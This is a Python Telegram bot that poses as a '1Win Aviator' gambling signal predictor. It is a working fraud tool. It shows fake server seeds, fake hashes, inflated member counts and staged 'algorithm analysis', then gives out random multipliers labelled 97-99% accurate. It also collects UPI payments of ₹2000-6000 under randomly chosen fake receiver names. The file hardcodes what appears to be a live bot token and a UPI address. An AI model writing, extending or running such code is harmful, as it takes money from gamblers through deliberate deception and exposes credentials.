import telebot
from telebot import types
import random
import time
import os
import hashlib
import urllib.parse

# --- 🔐 PRIVATE CONFIGURATION ---
BOT_TOKEN = "8402941434:AAFpbeqcIZU5HTeVxxnzjk5XCnyGwgLrzhk"
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

OWNER_ID = 8188755760 # Sirf aapka access
REAL_UPI = "swatantrsingh42@okhdfcbank" # Paisa yahan aayega

FAKE_NAMES = ["1win Aviator signal bot", "Raj Kumar", "Amit Singh", "Aviator Bot", "Vipin Kumar", "Rahul ptel", "reya singh", "IPN", "1Win Hack"]

def get_live_hash():
    return hashlib.sha256(str(time.time()).encode()).hexdigest()[:16].upper()

# --- 🏠 START HANDLER ---
@bot.message_handler(commands=["start"])
def start(message):
    uid = message.chat.id
    if not os.path.exists("users.txt"): open("users.txt", "w").close()
    with open("users.txt", "a+") as f:
        f.seek(0)
        if str(uid) not in f.read(): f.write(f"{uid}\n")
    
    count = len(open("users.txt").readlines())
    try: bot.set_my_description(f"🟢 SERVER SYNCED | 🛰️ SEED: {get_live_hash()} | 👥 Members: {count + 540}")
    except: pass

    welcome = (
        f"🤖 **AVIATOR PREMIUM PREDICTOR V10**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📡 **Status:** Connected to 1Win Server\n"
        f"🛰️ **Current Seed:** `{get_live_hash()}`\n"
    )

    if uid == OWNER_ID:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("NEXT 🚀", "Admin Panel 👑")
        bot.send_message(uid, welcome + "👑 **Owner Access Active**", reply_markup=markup)
    else:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("💰 VIP Plan ₹2000 (8 Min) ✅", callback_data="buy_2000"),
            types.InlineKeyboardButton("💰 VIP Plan ₹4000 (15 Min) ✅", callback_data="buy_4000"),
            types.InlineKeyboardButton("💰 VIP Plan ₹6000 (30 Min) ✅", callback_data="buy_6000")
        )
        bot.send_message(uid, welcome + "Signals ke liye plan select karein:", reply_markup=markup)

# --- 💳 PAYMENT HANDLER ---
@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_"))
def handle_payment(call):
    amt = call.data.split("_")[1]
    display_name = random.choice(FAKE_NAMES)
    params = {"pa": REAL_UPI, "pn": display_name, "am": amt, "cu": "INR", "mc": "5411", "tr": f"SYNC{get_live_hash()[:5]}"}
    upi_link = "upi://pay?" + urllib.parse.urlencode(params)
    qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(upi_link)}"
    
    caption = f"💳 **PAYMENT INVOICE**\n━━━━━━━━━━━━━━━━━━━━\n👤 **Receiver:** `{display_name}`\n💰 **Amount:** ₹{amt}\n🆔 **Ref ID:** `AI-WIN-{random.randint(1000,9999)}`\n\n✅ Scan karke pay karein aur 12-digit UTR bhejein."
    bot.send_photo(call.message.chat.id, qr_url, caption=caption)

# --- 🛡️ ADMIN APPROVAL SYSTEM (SSC) ---
@bot.message_handler(func=lambda m: len(m.text) == 12 and m.text.isdigit())
def ask_approval(message):
    user_id = message.chat.id
    utr = message.text
    bot.send_message(user_id, "⏳ **UTR received!** Admin verification ka intezar karein. Confirm hote hi signal button mil jayega.")
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
               types.InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}"))
    bot.send_message(OWNER_ID, f"💰 **Naya Payment Request!**\n\n👤 User ID: `{user_id}`\n🔢 UTR: `{utr}`", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith(("approve_", "reject_")))
def admin_action(call):
    action, user_id = call.data.split("_")
    if action == "approve":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("NEXT 🚀")
        bot.send_message(user_id, "🎉 **VIP Access Approved!**\n\nAapka bot ab chalu hai. Niche button dabayein.", reply_markup=markup)
        bot.edit_message_text(f"✅ User `{user_id}` approved.", call.message.chat.id, call.message.message_id)
    else:
        bot.send_message(user_id, "❌ **Payment Rejected!** Sahi UTR bhejein.")
        bot.edit_message_text(f"❌ User `{user_id}` rejected.", call.message.chat.id, call.message.message_id)

# --- 🚀 SIGNAL ENGINE ---
@bot.message_handler(func=lambda m: m.text == "NEXT 🚀")
def next_signal(message):
    load = bot.send_message(message.chat.id, f"📡 **Fetching Server Hash...**\n`Seed: {get_live_hash()}`")
    time.sleep(1.2)
    bot.edit_message_text(f"🛰️ **Analyzing 1Win Algorithm...**", message.chat.id, load.message_id)
    time.sleep(1.2)
    bot.delete_message(message.chat.id, load.message_id)
    val = round(random.uniform(1.30, 15.80), 2)
    bot.send_message(message.chat.id, f"🚀 **SIGNAL: {val}x**\n📊 Accuracy: {random.randint(97,99)}%\n🟢 **STATUS: SYNCED**")

# --- 👑 ADMIN PANEL ---
@bot.message_handler(func=lambda m: m.text == "Admin Panel 👑")
def admin_p(message):
    if message.chat.id == OWNER_ID:
        count = len(open("users.txt").readlines())
        bot.send_message(message.chat.id, f"👤 **Total Users:** {count}\n💰 **Status:** UPI Active")

bot.infinity_polling()
        

